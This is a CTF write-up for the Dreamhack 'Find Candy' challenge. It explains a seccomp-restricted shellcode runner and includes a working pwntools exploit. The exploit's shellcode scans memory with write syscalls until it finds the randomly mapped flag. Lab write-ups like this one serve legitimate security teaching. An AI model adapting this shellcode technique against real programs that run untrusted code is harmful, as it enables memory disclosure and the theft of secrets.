+++
date = '2026-05-20'
draft = false
title = 'Dreamhack Find Candy Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
어딘가에 사탕을 숨겨놓았어요
쉘코드로 사탕을 찾아주세요!

-  flag 파일은 458바이트 크기 아스키아트입니다. 아스키아트 속에 DH{...} 형태의 플래그가 존재합니다.


---

```c
fd = open("./flag", 0);
  if ( fd == -1 )
  {
    puts("open error");
    exit(1);
  }
  v3 = rand();
  buf = mmap((void *)((unsigned int)(v3 << 12) | 0x80000000000LL), 0x1000u, 3, 34, 0, 0);
  if ( buf == (void *)-1LL )
  {
    puts("mmap error");
    exit(1);
  }
  if ( read(fd, buf, 0x500u) == -1 )
  {
    puts("read error");
    exit(1);
  }
  close(fd);
  s = (char *)mmap((void *)0xBEEFDEAD000LL, 0x1000u, 7, 34, 0, 0);
  if ( s == (char *)-1LL )
  {
    puts("mmap error");
    exit(1);
  }
  memset(s, '\x90', 0x1000u);
  memcpy(s, &stub, 0x30u);
  if ( mmap((void *)0xDEADBEEF000LL, 0x1000u, 3, 34, 0, 0) == (void *)-1LL )
  {
    puts("mmap error");
    exit(1);
  }
  puts("find me :) ");
  sleep(1u);
  printf("shellcode: ");
  read(0, s + 48, 0x3E8u);
  Sandbox();
  return ((int (*)(void))s)();
```

## Identifying the vulnerabilities

`seccomp-tools` quickly tells us we can only use the `write` and `arch_prctl` syscalls.

The flag is read and written into a random address, anywhere between `0x80000000000` and `0x800fffffffff`.

Since we don't know the exact address of the flag, we can start printing `0x1000` byte chunks starting at the minimum address to stdout, until the `write` syscalls stops returning EFAULT (-14). 

That's all I did, and we quickly solve this challenge!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/findcandy/deploy/find_candy')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:19042'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
   
#avem write si arch_prctl doar
#read(fd, buf, 0x500u)
#se citest din fd in buf, buf fiind addr aia random peste 0x80045ffa000
#stim sigur ca flag o sa fie la 0x80000000000 + x(mare)
#nr sub xffffffff

#all regs are emptied
#avem doar write practic; write error da crash?

#write to stdout

sh = asm('''
mov rsi, 0x80000000000

mov rdi, 1
add rsi, 0x1000
mov rdx, 0x1000

mov rax, 1
syscall

cmp rax, -14
je $-34
''')


p.recvuntil(b": ")
p.send(sh)
 

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/find_candy.py)**.
